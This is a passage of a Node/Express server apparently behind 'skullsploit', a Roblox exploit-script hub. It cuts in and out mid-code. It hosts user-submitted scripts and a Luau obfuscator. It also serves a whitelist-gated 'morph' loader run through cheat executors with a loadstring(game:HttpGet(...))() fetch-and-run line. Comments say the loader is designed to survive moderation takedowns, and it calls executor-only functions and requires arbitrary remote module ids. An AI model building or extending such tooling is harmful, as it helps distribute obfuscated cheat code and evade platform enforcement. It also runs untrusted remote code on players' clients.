  const e = keys.find(k => k.key === req.params.key);
  if (!e) return res.status(404).json({ error: 'not found' });
  e.revoked = true;
  writeJson(KEYS_FILE, keys);
  const removedUsers = purgeUserByKey(req.params.key);
  audit(req, 'key.revoked', e.key, { boundUsername: e.boundUsername || null, removedUsers });
  res.json({ ok: true, removedUsers });
});

app.delete('/api/keys/:key', writeLimiter, requireOwner, (req, res) => {
  let keys = readJson(KEYS_FILE, []);
  const e = keys.find(k => k.key === req.params.key);
  if (!e) return res.status(404).json({ error: 'not found' });
  keys = keys.filter(k => k.key !== req.params.key);
  writeJson(KEYS_FILE, keys);
  const removedUsers = purgeUserByKey(req.params.key);
  audit(req, 'key.deleted', e.key, { boundUsername: e.boundUsername || null, removedUsers });
  res.json({ ok: true, removedUsers });
});

// ===== SCRIPTS =====
const CATEGORIES = ['script', 'gui', 'morph'];
function normCategory(c) {
  const v = String(c || '').toLowerCase().trim();
  return CATEGORIES.includes(v) ? v : 'script';
}

app.get('/api/scripts', requireUser, (req, res) => {
  const scripts = readJson(SCRIPTS_FILE, []);
  const me = req.session.user.username;
  res.json({
    scripts: scripts.map(s => ({
      id: s.id,
      title: s.title,
      category: normCategory(s.category),
      tags: s.tags || [],
      author: s.author,
      body: s.body,
      createdAt: s.createdAt,
      updatedAt: s.updatedAt || null,
      likeCount: (s.likes || []).length,
      liked: (s.likes || []).includes(me)
    }))
  });
});

function buildScript({ title, body, tags, category, author }) {
  if (typeof title !== 'string' || typeof body !== 'string') return { error: 'title and body are required' };
  const t = title.trim();
  const b = body;
  if (!t || !b.trim()) return { error: 'title and body are required' };
  if (b.length > 32 * 1024) return { error: 'script body too large (max 32 KB)' };
  const rawTags = Array.isArray(tags) ? tags : String(tags || '').split(',');
  const cleanTags = rawTags.map(x => String(x).trim().slice(0, 24)).filter(Boolean).slice(0, 10);
  return {
    script: {
      id: crypto.randomUUID(),
      title: t.slice(0, 80),
      category: normCategory(category),
      tags: cleanTags,
      body: b,
      author,
      likes: [],
      createdAt: new Date().toISOString()
    }
  };
}

app.post('/api/scripts', writeLimiter, requireDev, (req, res) => {
  const { title, tags = [], body, category } = req.body || {};
  const r = buildScript({ title, body, tags, category, author: req.session.user.username });
  if (r.error) return res.status(r.error.includes('too large') ? 413 : 400).json({ error: r.error });
  const scripts = readJson(SCRIPTS_FILE, []);
  scripts.unshift(r.script);
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.created', r.script.id, { title: r.script.title, category: r.script.category });
  res.json({ ok: true, script: r.script });
});

const IMPORT_MAX = 500;
app.post('/api/scripts/import', writeLimiter, requireDev, (req, res) => {
  const { items } = req.body || {};
  if (!Array.isArray(items)) return res.status(400).json({ error: 'expected { items: [ ... ] }' });
  if (items.length === 0) return res.status(400).json({ error: 'no items to import' });
  if (items.length > IMPORT_MAX) return res.status(400).json({ error: `too many items at once (max ${IMPORT_MAX})` });

  const scripts = readJson(SCRIPTS_FILE, []);
  const imported = [];
  const skipped = [];
  for (let i = 0; i < items.length; i++) {
    const it = items[i] || {};
    const r = buildScript({
      title: it.title,
      body: it.body,
      tags: it.tags,
      category: it.category,
      author: req.session.user.username
    });
    if (r.error) { skipped.push({ index: i, title: it.title || null, reason: r.error }); continue; }
    scripts.unshift(r.script);
    imported.push({ id: r.script.id, title: r.script.title, category: r.script.category });
  }
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.imported', null, { count: imported.length, skipped: skipped.length });
  res.json({ ok: true, imported: imported.length, skipped: skipped.length, skippedDetail: skipped.slice(0, 20) });
});

// edit your own script
app.patch('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
  const scripts = readJson(SCRIPTS_FILE, []);
  const s = scripts.find(x => x.id === req.params.id);
  if (!s) return res.status(404).json({ error: 'not found' });
  const me = req.session.user.username;
  if (s.author !== me && !isOwnerUsername(me)) return res.status(403).json({ error: 'only the author can edit this' });

  const { title, body, tags, category } = req.body || {};
  if (title !== undefined) {
    if (typeof title !== 'string') return res.status(400).json({ error: 'invalid title' });
    const t = title.trim();
    if (!t) return res.status(400).json({ error: 'title cannot be empty' });
    s.title = t.slice(0, 80);
  }
  if (body !== undefined) {
    if (typeof body !== 'string') return res.status(400).json({ error: 'invalid body' });
    if (!body.trim()) return res.status(400).json({ error: 'body cannot be empty' });
    if (body.length > 32 * 1024) return res.status(413).json({ error: 'script body too large (max 32 KB)' });
    s.body = body;
  }
  if (category !== undefined) s.category = normCategory(category);
  if (tags !== undefined) {
    const rawTags = Array.isArray(tags) ? tags : String(tags || '').split(',');
    s.tags = rawTags.map(x => String(x).trim().slice(0, 24)).filter(Boolean).slice(0, 10);
  }
  s.updatedAt = new Date().toISOString();
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.edited', s.id, { title: s.title });
  res.json({ ok: true, script: s });
});

app.delete('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
  let scripts = readJson(SCRIPTS_FILE, []);
  const t = scripts.find(s => s.id === req.params.id);
  if (!t) return res.status(404).json({ error: 'not found' });
  const me = req.session.user.username;
  if (t.author !== me && !isOwnerUsername(me)) return res.status(403).json({ error: 'only the author can remove this' });
  scripts = scripts.filter(s => s.id !== req.params.id);
  writeJson(SCRIPTS_FILE, scripts);
  audit(req, 'script.deleted', t.id, { title: t.title, author: t.author });
  res.json({ ok: true });
});

// ----- luau obfuscator (dev-only) -----
app.post('/api/obfuscate', writeLimiter, requireDev, (req, res) => {
  const source = (req.body && typeof req.body.source === 'string') ? req.body.source : '';
  if (!source.trim()) return res.status(400).json({ error: 'source is empty' });
  if (source.length > 120_000) return res.status(413).json({ error: 'source too large (max 120kb)' });
  const b = req.body || {};
  const opts = {
    encryptStrings:  b.encryptStrings  !== false,
    encryptCalls:    b.encryptCalls    !== false,
    indirectNumbers: b.indirectNumbers !== false,
    renameLocals:    b.renameLocals    !== false,
    stripComments:   b.stripComments   !== false,
  };
  let r;
  try { r = luaobf.obfuscate(source, opts); }
  catch (e) { return res.status(500).json({ error: 'obfuscate failed: ' + (e && e.message || 'unknown') }); }
  if (!r.ok) return res.status(400).json({ error: r.error });
  audit(req, 'obfuscate.run', null, {
    sourceBytes: r.stats.sourceBytes,
    outputBytes: r.stats.outputBytes,
    strings: r.stats.strings,
    numbers: r.stats.numbers,
    encryptStrings:  !!opts.encryptStrings,
    encryptCalls:    !!opts.encryptCalls,
    indirectNumbers: !!opts.indirectNumbers,
    renameLocals:    !!opts.renameLocals,
    stripComments:   !!opts.stripComments,
  });
  res.json({ ok: true, output: r.output, stats: r.stats });
});

// ----- morph hub (separate from skullsploit's gated content) -----
// The morph GUI is a standalone Roblox tool. Skullsploit only hosts the
// whitelist + the loader script + usage logs. The whitelist gate is
// username-based (player runs the loader; loader hits /api/morphs/check
// with their Roblox username).

const ROBLOX_NAME_RE = /^[A-Za-z0-9_]{3,20}$/;

// Issues a fresh one-time-use 60-second nonce. Required for any signed
// morph request. Rate-limited like the rest of the public morph endpoints.
// No auth needed — a nonce alone is useless without MORPH_MAC_KEY.
app.get('/api/morphs/nonce', morphCheckLimiter, (req, res) => {
  const nonce = issueMorphNonce();
  res.json({ nonce, expires: Date.now() + MORPH_NONCE_TTL_MS });
});

app.get('/api/morphs', morphCheckLimiter, requireMorphToken, (req, res) => {
  // Returns the morph catalog. For admin (session) callers we hand back full
  // entries because the admin UI uses /api/morphs/custom anyway; this branch
  // is mostly a courtesy. For Roblox (HMAC) callers we strip down to NAMES
  // ONLY — the actual `require()` id, method, style, args for any single
  // morph is fetched just-in-time from /api/morphs/entry when the player
  // clicks it. That changes scraping the catalog from one cheap fetch into
  // ~7000 individually-signed, individually-nonced, rate-limited fetches.
  const all = readJson(MORPH_CUSTOM_FILE, {});
  const sessUser = req.session && req.session.user;
  if (sessUser && hasMorphAccess(sessUser.username)) {
    return res.json({ morphs: all, username: req.morphUser || null });
  }
  // Names-only map. Kept as `{name: {}}` (object → empty-object) so the
  // in-game ClientHandler — which iterates via `pairs()` and does
  // `e.__name = name` on each value — still works without changes. The
  // values carry no morph data; the real entry is fetched at click time.
  const names = {};
  for (const k of Object.keys(all)) names[k] = {};
  res.json({ morphs: names, username: req.morphUser || null });
});

// Single-entry fetch. Used by MainModule's fireFor() right before calling
// `require(N).method(args)`. The full per-morph payload is only handed out
// one-at-a-time, gated by HMAC + nonce + a tight per-IP rate limit.
app.get('/api/morphs/entry', morphEntryLimiter, requireMorphToken, (req, res) => {
  const name = String((req.query && req.query.name) || '').trim();
  if (!name || !CUSTOM_NAME_RE.test(name)) return res.status(400).json({ error: 'invalid name' });
  const all = readJson(MORPH_CUSTOM_FILE, {});
  const key = findCustomKey(all, name);
  if (!key) return res.status(404).json({ error: 'not found' });
  res.json({ entry: all[key], username: req.morphUser || null });
});

// Helper: find a custom-morph entry by case-insensitive name match.
// Returns the actual stored key so subsequent operations write under the right name.
function findCustomKey(all, target) {
  if (all[target]) return target;
  const lower = String(target).toLowerCase();
  for (const k of Object.keys(all)) {
    if (k.toLowerCase() === lower) return k;
  }
  return null;
}

// ----- custom morph CRUD (owner only) -----
const CUSTOM_NAME_RE  = /^[A-Za-z0-9_\- ]{1,40}$/;
const CUSTOM_STYLES   = new Set(['args', 'colon', 'call', 'model']);

app.get('/api/morphs/custom', requireMorphAccess, (req, res) => {
  res.json({ entries: readJson(MORPH_CUSTOM_FILE, {}) });
});

app.post('/api/morphs/custom', writeLimiter, requireMorphAccess, (req, res) => {
  const b = req.body || {};
  const name   = typeof b.name === 'string' ? b.name.trim() : '';
  const id     = Number(b.id);
  const style  = typeof b.style === 'string' ? b.style.trim() : '';
  const method = typeof b.method === 'string' ? b.method.trim() : '';
  const argsRaw = b.args;

  if (!CUSTOM_NAME_RE.test(name)) return res.status(400).json({ error: 'name must be 1-40 chars (A-Z 0-9 _ - space)' });
  if (!Number.isFinite(id) || id <= 0) return res.status(400).json({ error: 'id must be a positive number' });
  if (!CUSTOM_STYLES.has(style)) return res.status(400).json({ error: 'style must be args, colon, call, or model' });
  if ((style === 'args' || style === 'colon') && !method) return res.status(400).json({ error: 'method required for args/colon styles' });

  // Args: array of strings/numbers. Use the literal string "USERNAME" as a
  // placeholder — it gets substituted with the player's roblox name at fire time.
  let args = null;
  if (Array.isArray(argsRaw)) {
    args = [];
    for (const a of argsRaw) {
      if (typeof a === 'string') args.push(a.slice(0, 200));
      else if (typeof a === 'number' && Number.isFinite(a)) args.push(a);
      else if (typeof a === 'boolean') args.push(a);
      // skip anything else
    }
    if (args.length === 0) args = null;
  }

  const all = readJson(MORPH_CUSTOM_FILE, {});
  const entry = { id, style };
  if (method) entry.method = method;
  if (args)   entry.args   = args;
  if (b.noUsername === true) entry.noUsername = true;
  entry.addedBy = req.session.user.username;
  entry.addedAt = new Date().toISOString();

  all[name] = entry;
  writeJson(MORPH_CUSTOM_FILE, all);
  audit(req, 'morph.custom.added', name, { id, style, method, args, noUsername: !!entry.noUsername });
  res.json({ ok: true, name, entry });
});

app.delete('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, res) => {
  const target = String(req.params.name || '').trim();
  const all = readJson(MORPH_CUSTOM_FILE, {});
  const key = findCustomKey(all, target);
  if (!key) return res.status(404).json({ error: 'not found' });
  delete all[key];
  writeJson(MORPH_CUSTOM_FILE, all);
  audit(req, 'morph.custom.removed', key, {});
  res.json({ ok: true, name: key });
});

// Update an existing custom morph in place. Any field can be partially updated.
// Pass `newName` to also rename the entry (the URL still uses the OLD name).
app.patch('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, res) => {
  const target = String(req.params.name || '').trim();
  const all = readJson(MORPH_CUSTOM_FILE, {});
  const key = findCustomKey(all, target);
  if (!key) return res.status(404).json({ error: 'not found' });

  const b = req.body || {};
  const entry = all[key];

  if (b.id !== undefined) {
    const id = Number(b.id);
    if (!Number.isFinite(id) || id <= 0) return res.status(400).json({ error: 'id must be a positive number' });
    entry.id = id;
  }
  if (b.style !== undefined) {
    if (!CUSTOM_STYLES.has(b.style)) return res.status(400).json({ error: 'style must be args, colon, call, or model' });
    entry.style = b.style;
  }
  if (b.method !== undefined) {
    const m = String(b.method).trim();
    if (m) entry.method = m; else delete entry.method;
  }
  if (b.args !== undefined) {
    let args = null;
    if (Array.isArray(b.args)) {
      args = [];
      for (const a of b.args) {
        if (typeof a === 'string') args.push(a.slice(0, 200));
        else if (typeof a === 'number' && Number.isFinite(a)) args.push(a);
        else if (typeof a === 'boolean') args.push(a);
      }
      if (args.length === 0) args = null;
    }
    if (args) entry.args = args;
    else delete entry.args;
  }
  if (b.noUsername !== undefined) {
    if (b.noUsername === true) entry.noUsername = true;
    else delete entry.noUsername;
  }
  // Final shape sanity: args/colon styles still need a method
  if ((entry.style === 'args' || entry.style === 'colon') && !entry.method) {
    return res.status(400).json({ error: 'method required for args/colon styles' });
  }

  entry.updatedAt = new Date().toISOString();
  entry.updatedBy = req.session.user.username;

  // Optional rename
  let finalName = key;
  if (b.newName && typeof b.newName === 'string') {
    const nn = b.newName.trim();
    if (nn !== key) {
      if (!CUSTOM_NAME_RE.test(nn)) return res.status(400).json({ error: 'new name must be 1-40 chars (A-Z 0-9 _ - space)' });
      // case-insensitive conflict check, but allow rename to a different case of the same key
      const conflict = findCustomKey(all, nn);
      if (conflict && conflict !== key) return res.status(409).json({ error: 'a morph with that name already exists' });
      delete all[key];
      all[nn] = entry;
      finalName = nn;
    } else {
      all[key] = entry;
    }
  } else {
    all[key] = entry;
  }

  writeJson(MORPH_CUSTOM_FILE, all);
  audit(req, 'morph.custom.updated', key, {
    renamedTo: finalName !== key ? finalName : undefined,
    id: entry.id, style: entry.style, method: entry.method, args: entry.args,
    noUsername: !!entry.noUsername
  });
  res.json({ ok: true, name: finalName, entry });
});

app.get('/api/morphs/check', morphCheckLimiter, requireMorphToken, (req, res) => {
  // requireMorphToken already verified the encrypted ?u= AND that the resolved
  // username is on the whitelist. If we got here, the answer is yes.
  const wl = readJson(MORPH_WL_FILE, []);
  const entry = wl.find(e => e.username.toLowerCase() === (req.morphUser || '').toLowerCase());
  if (!entry) return res.json({ ok: true });
  res.json({ ok: true, expires: entry.expires || null, note: entry.note || '' });
});

app.post('/api/morphs/log', morphLogLimiter, requireMorphToken, (req, res) => {
  const b = req.body || {};
  const username = typeof b.username === 'string' ? b.username.trim() : '';
  const morph    = typeof b.morph === 'string' ? b.morph.trim() : '';
  if (!username || !morph) return res.status(400).json({ error: 'missing username/morph' });
  if (!ROBLOX_NAME_RE.test(username)) return res.status(400).json({ error: 'invalid username' });
  if (morph.length > 80) return res.status(400).json({ error: 'morph name too long' });

  // The signed identity (req.morphUser, resolved from the HMAC'd ?u= param)
  // must match the username being logged. Otherwise anyone with a valid
  // signature could forge log entries under a different name.
  if (req.morphUser && username.toLowerCase() !== String(req.morphUser).toLowerCase()) {
    return res.status(403).json({ error: 'forbidden' });
  }

  // verify the actor IS whitelisted before accepting their log
  const wl = readJson(MORPH_WL_FILE, []);
  const isWhitelisted = wl.some(e => e.username.toLowerCase() === username.toLowerCase());
  if (!isWhitelisted) return res.status(403).json({ error: 'not whitelisted' });

  const log = readJson(MORPH_LOG_FILE, []);
  log.unshift({
    at: new Date().toISOString(),
    username,
    morph,
    placeId: b.placeId ? String(b.placeId).slice(0, 32) : null,
    ip: String(req.ip || '').slice(0, 64)
  });
  if (log.length > 5000) log.length = 5000;
  writeJson(MORPH_LOG_FILE, log);
  res.json({ ok: true });
});

// ----- owner-only management -----
app.get('/api/morphs/whitelist', requireMorphAccess, (req, res) => {
  res.json({ entries: readJson(MORPH_WL_FILE, []) });
});

app.post('/api/morphs/whitelist', writeLimiter, requireMorphAccess, (req, res) => {
  const b = req.body || {};
  const username = typeof b.username === 'string' ? b.username.trim() : '';
  if (!ROBLOX_NAME_RE.test(username)) return res.status(400).json({ error: 'invalid roblox username (3-20 chars, A-Z/0-9/_)' });
  const note = typeof b.note === 'string' ? b.note.slice(0, 200) : '';
  let expires = null;
  if (b.days) {
    const d = Number(b.days);
    if (Number.isFinite(d) && d > 0) expires = new Date(Date.now() + d * 86400_000).toISOString();
  }
  const wl = readJson(MORPH_WL_FILE, []);
  if (wl.some(e => e.username.toLowerCase() === username.toLowerCase())) {
    return res.status(409).json({ error: 'already whitelisted' });
  }
  const entry = { username, note, addedBy: req.session.user.username, addedAt: new Date().toISOString(), expires };
  wl.unshift(entry);
  writeJson(MORPH_WL_FILE, wl);
  audit(req, 'morph.whitelist.added', username, { note, expires });
  res.json({ ok: true, entry });
});

app.delete('/api/morphs/whitelist/:username', writeLimiter, requireMorphAccess, (req, res) => {
  const target = String(req.params.username || '').trim();
  let wl = readJson(MORPH_WL_FILE, []);
  const before = wl.length;
  wl = wl.filter(e => e.username.toLowerCase() !== target.toLowerCase());
  if (wl.length === before) return res.status(404).json({ error: 'not whitelisted' });
  writeJson(MORPH_WL_FILE, wl);
  audit(req, 'morph.whitelist.removed', target, {});
  res.json({ ok: true });
});

app.get('/api/morphs/log', requireMorphAccess, (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
  const all = readJson(MORPH_LOG_FILE, []);
  res.json({ logs: all.slice(0, limit) });
});

// Render a Buffer as a Lua double-quoted string of \xNN escapes — used to
// embed our binary XOR + HMAC keys into the loader source.
function bufToLuaEscape(buf) {
  let s = '';
  for (let i = 0; i < buf.length; i++) s += '\\x' + buf[i].toString(16).padStart(2, '0');
  return s;
}

// Public loader served as plain text/lua. Hits the secured morph API using
// the same HMAC + one-time-nonce protocol as MainModule, then builds the
// morph GUI inline (no Roblox asset dependency). Player usage:
//
//   loadstring(game:HttpGet("https://skullsploit.com/m.lua"))()
//
// Auto-runs on load. No `require()` involved, so it survives the published
// MainModule asset getting flagged off the Creator Store. Works in any
// context that gives us an HTTP-get primitive (game:HttpGet from most
// executors, request() from Synapse-style frameworks, or HttpService for
// server-side use).
//
// The XOR + HMAC keys are interpolated into the source. They're the same
// keys baked into MainModule — leaking either is equivalent to decompiling
// the published model, so we accept that exposure. Server-side defenses
// (one-time nonces, rate limits, whitelist gate, per-entry single-fetch)
// remain the real boundary; the keys alone get an attacker nothing without
// a whitelisted username and per-fetch nonces consumed at 30/min/IP.
function buildMorphLoader(baseUrl) {
  const xorKey = bufToLuaEscape(MORPH_USERNAME_KEY);
  const macKey = bufToLuaEscape(MORPH_MAC_KEY);
  return buildMorphLoaderBody(baseUrl, xorKey, macKey);
}

function buildMorphLoaderBody(baseUrl, xorKey, macKey) {
  return `-- skullsploit morphs · standalone loader
-- usage:
--   loadstring(game:HttpGet("${baseUrl}/m.lua"))()
-- works in any context with an HTTP-get primitive (executor / F9 console
-- with game:HttpGet injected, Synapse-style request(), or server-side
-- HttpService). whitelist-gated; ask the owner for access.

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
local BASE = "${baseUrl}"

local XOR_KEY = "${xorKey}"
local MAC_KEY = "${macKey}"

-- ----- SHA-256 + HMAC (pure Luau, bit32 only) -----
local SHA256_K = {
  0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
  0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
  0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
  0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
  0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
  0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
  0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
  0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
}
local function rrot(x, n) return bit32.bor(bit32.rshift(x, n), bit32.lshift(x, 32 - n)) end
local function sha256_binary(msg)
  local H = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19}
  local bitLen = #msg * 8
  msg = msg .. "\\x80"
  while (#msg % 64) ~= 56 do msg = msg .. "\\0" end
  msg = msg .. "\\0\\0\\0\\0" .. string.char(
    bit32.band(bit32.rshift(bitLen, 24), 0xff),
    bit32.band(bit32.rshift(bitLen, 16), 0xff),
    bit32.band(bit32.rshift(bitLen, 8), 0xff),
    bit32.band(bitLen, 0xff))
  for chunk = 1, #msg, 64 do
    local w = {}
    for i = 0, 15 do
      local p = chunk + i * 4
      w[i] = bit32.bor(
        bit32.lshift(msg:byte(p), 24),
        bit32.lshift(msg:byte(p+1), 16),
        bit32.lshift(msg:byte(p+2), 8),
        msg:byte(p+3))
    end
    for i = 16, 63 do
      local s0 = bit32.bxor(rrot(w[i-15], 7), rrot(w[i-15], 18), bit32.rshift(w[i-15], 3))
      local s1 = bit32.bxor(rrot(w[i-2], 17), rrot(w[i-2], 19), bit32.rshift(w[i-2], 10))
      w[i] = bit32.band(w[i-16] + s0 + w[i-7] + s1, 0xffffffff)
    end
    local a,b,c,d,e,f,g,h = H[1],H[2],H[3],H[4],H[5],H[6],H[7],H[8]
    for i = 0, 63 do
      local S1 = bit32.bxor(rrot(e,6), rrot(e,11), rrot(e,25))
      local ch = bit32.bxor(bit32.band(e,f), bit32.band(bit32.bnot(e), g))
      local t1 = bit32.band(h + S1 + ch + SHA256_K[i+1] + w[i], 0xffffffff)
      local S0 = bit32.bxor(rrot(a,2), rrot(a,13), rrot(a,22))
      local maj = bit32.bxor(bit32.band(a,b), bit32.band(a,c), bit32.band(b,c))
      local t2 = bit32.band(S0 + maj, 0xffffffff)
      h = g; g = f; f = e; e = bit32.band(d + t1, 0xffffffff)
      d = c; c = b; b = a; a = bit32.band(t1 + t2, 0xffffffff)
    end
    H[1] = bit32.band(H[1] + a, 0xffffffff)
    H[2] = bit32.band(H[2] + b, 0xffffffff)
    H[3] = bit32.band(H[3] + c, 0xffffffff)
    H[4] = bit32.band(H[4] + d, 0xffffffff)
    H[5] = bit32.band(H[5] + e, 0xffffffff)
    H[6] = bit32.band(H[6] + f, 0xffffffff)
    H[7] = bit32.band(H[7] + g, 0xffffffff)
    H[8] = bit32.band(H[8] + h, 0xffffffff)
  end
  local out = {}
  for i = 1, 8 do
    out[i] = string.char(
      bit32.band(bit32.rshift(H[i], 24), 0xff),
      bit32.band(bit32.rshift(H[i], 16), 0xff),
      bit32.band(bit32.rshift(H[i], 8), 0xff),
      bit32.band(H[i], 0xff))
  end
  return table.concat(out)
end
local function tohex(s) local o={} for i=1,#s do o[i]=string.format("%02x", s:byte(i)) end return table.concat(o) end
local function hmac_hex(key, message)
  local bs = 64
  if #key > bs then key = sha256_binary(key) end
  if #key < bs then key = key .. string.rep("\\0", bs - #key) end
  local o,i = {},{}
  for n = 1, bs do
    o[n] = string.char(bit32.bxor(key:byte(n), 0x5c))
    i[n] = string.char(bit32.bxor(key:byte(n), 0x36))
  end
  return tohex(sha256_binary(table.concat(o) .. sha256_binary(table.concat(i) .. message)))
end

local function encryptName(name)
  local plain = tostring(name) .. ":" .. tostring(os.time())
  local out = {}
  for i = 1, #plain do
    out[i] = string.format("%02x", bit32.bxor(plain:byte(i), XOR_KEY:byte(((i-1) % #XOR_KEY) + 1)))
  end
  return table.concat(out)
end

-- ----- HTTP shims (executor first, server fallback) -----
local function httpGet(url)
  -- game:HttpGet (executor-injected on most frameworks)
  local ok, body = pcall(function() return game:HttpGet(url) end)
  if ok and body then return body end
  -- Synapse-style request()
  local req
  do
    local ok1, r1 = pcall(function() return request end)
    if ok1 and typeof(r1) == "function" then req = r1 end
    if not req then
      local ok2, r2 = pcall(function() return http_request end)
      if ok2 and typeof(r2) == "function" then req = r2 end
    end
  end
  if typeof(req) == "function" then
    local ok2, res = pcall(req, { Url = url, Method = "GET" })
    if ok2 and res and res.Body then return res.Body end
  end
  -- HttpService (server-side)
  local ok3, b = pcall(function() return HttpService:GetAsync(url, true) end)
  if ok3 and b then return b end
  return nil
end

local function httpPost(url, tbl)
  local body = HttpService:JSONEncode(tbl)
  local req
  do
    local ok1, r1 = pcall(function() return request end)
    if ok1 and typeof(r1) == "function" then req = r1 end
    if not req then
      local ok2, r2 = pcall(function() return http_request end)
      if ok2 and typeof(r2) == "function" then req = r2 end
    end
  end
  if typeof(req) == "function" then
    pcall(req, { Url = url, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body })
    return
  end
  pcall(function()
    HttpService:RequestAsync({ Url = url, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body })
  end)
end

local function jdec(s)
  if not s then return nil end
  local ok, v = pcall(function() return HttpService:JSONDecode(s) end)
  if ok then return v end
  return nil
end

-- ----- signed-request helpers -----
local function fetchNonce()
  local d = jdec(httpGet(BASE .. "/api/morphs/nonce"))
  if not d or type(d.nonce) ~= "string" then return nil end
  return d.nonce
end

local function signedUrl(path, u)
  local n = fetchNonce()
  if not n then return nil end
  local ts = tostring(os.time())
  local sig = hmac_hex(MAC_KEY, u .. ":" .. n .. ":" .. ts)
  return BASE .. path .. "?u=" .. u .. "&n=" .. n .. "&t=" .. ts .. "&s=" .. sig
end

-- ----- whitelist check -----
local checkUrl = signedUrl("/api/morphs/check", encryptName(LP.Name))
if not checkUrl then warn("[morphs] could not fetch nonce") return end
local check = jdec(httpGet(checkUrl))
if not check or not check.ok then
  warn("[morphs] " .. LP.Name .. " is not whitelisted. ask the owner.")
  return
end

-- ----- names list -----
local listUrl = signedUrl("/api/morphs", encryptName(LP.Name))
if not listUrl then warn("[morphs] nonce fetch failed") return end
local data = jdec(httpGet(listUrl))
if not data or not data.morphs then warn("[morphs] failed to fetch list") return end

local names = {}
for name, _ in pairs(data.morphs) do table.insert(names, name) end
table.sort(names, function(a, b) return a:lower() < b:lower() end)

-- ----- per-entry cache + fire -----
local entryCache = {}
local function fetchEntry(name)
  if entryCache[name] then return entryCache[name] end
  local base = signedUrl("/api/morphs/entry", encryptName(LP.Name))
  if not base then return nil end
  local url = base .. "&name=" .. HttpService:UrlEncode(name)
  local d = jdec(httpGet(url))
  if not d or not d.entry then return nil end
  entryCache[name] = d.entry
  return d.entry
end

local function resolveArgs(entry)
  if entry.args and #entry.args > 0 then
    local out = {}
    for _, a in ipairs(entry.args) do table.insert(out, a == "USERNAME" and LP.Name or a) end
    return out
  end
  if entry.noUsername then return {} end
  return { LP.Name }
end

local function fire(name)
  local entry = fetchEntry(name)
  if not entry then return false, "fetch failed" end
  local ok, err = pcall(function()
    local mod = require(entry.id)
    if entry.style == "args" then
      local fn = mod[entry.method]
      if typeof(fn) == "function" then fn((table.unpack or unpack)(resolveArgs(entry))) end
    elseif entry.style == "colon" then
      local fn = mod[entry.method]
      if typeof(fn) == "function" then fn(mod, (table.unpack or unpack)(resolveArgs(entry))) end
    elseif entry.style == "call" then
      if typeof(mod) == "function" then mod((table.unpack or unpack)(resolveArgs(entry))) end
    end
  end)
  -- log it (fire-and-forget)
  local logUrl = signedUrl("/api/morphs/log", encryptName(LP.Name))
  if logUrl then httpPost(logUrl, { username = LP.Name, morph = name, placeId = tostring(game.PlaceId) }) end
  return ok, err
end

-- ----- GUI -----
local parent = (gethui and gethui()) or game:GetService("CoreGui")
local existing = parent:FindFirstChild("SkullMorphs")
if existing then existing:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "SkullMorphs"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = parent

local INK    = Color3.fromRGB(236, 233, 227)
local DIM    = Color3.fromRGB(144, 141, 134)
local FAINT  = Color3.fromRGB(79, 77, 72)
local BG     = Color3.fromRGB(13, 13, 13)
local BG2    = Color3.fromRGB(20, 20, 20)
local BG3    = Color3.fromRGB(35, 35, 35)
local LINE   = Color3.fromRGB(35, 34, 32)

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 340, 0, 480)
frame.Position = UDim2.new(0, 24, 0.5, -240)
frame.BackgroundColor3 = BG
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local stroke = Instance.new("UIStroke")
stroke.Color = LINE
stroke.Thickness = 1
stroke.Parent = frame

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 40)
header.BackgroundColor3 = BG2
header.BorderSizePixel = 0
header.Parent = frame

local hLine = Instance.new("Frame")
hLine.Size = UDim2.new(1, 0, 0, 1)
hLine.Position = UDim2.new(0, 0, 1, -1)
hLine.BackgroundColor3 = LINE
hLine.BorderSizePixel = 0
hLine.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -80, 1, 0)
title.Position = UDim2.new(0, 14, 0, 0)
title.BackgroundTransparency = 1
title.Font = Enum.Font.SourceSansBold
title.Text = "morphs \xc2\xb7 " .. LP.Name
title.TextColor3 = INK
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local count = Instance.new("TextLabel")
count.Size = UDim2.new(0, 60, 1, 0)
count.Position = UDim2.new(1, -80, 0, 0)
count.BackgroundTransparency = 1
count.Font = Enum.Font.Code
count.Text = tostring(#names)
count.TextColor3 = DIM
count.TextSize = 11
count.TextXAlignment = Enum.TextXAlignment.Right
count.Parent = header

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 32, 1, 0)
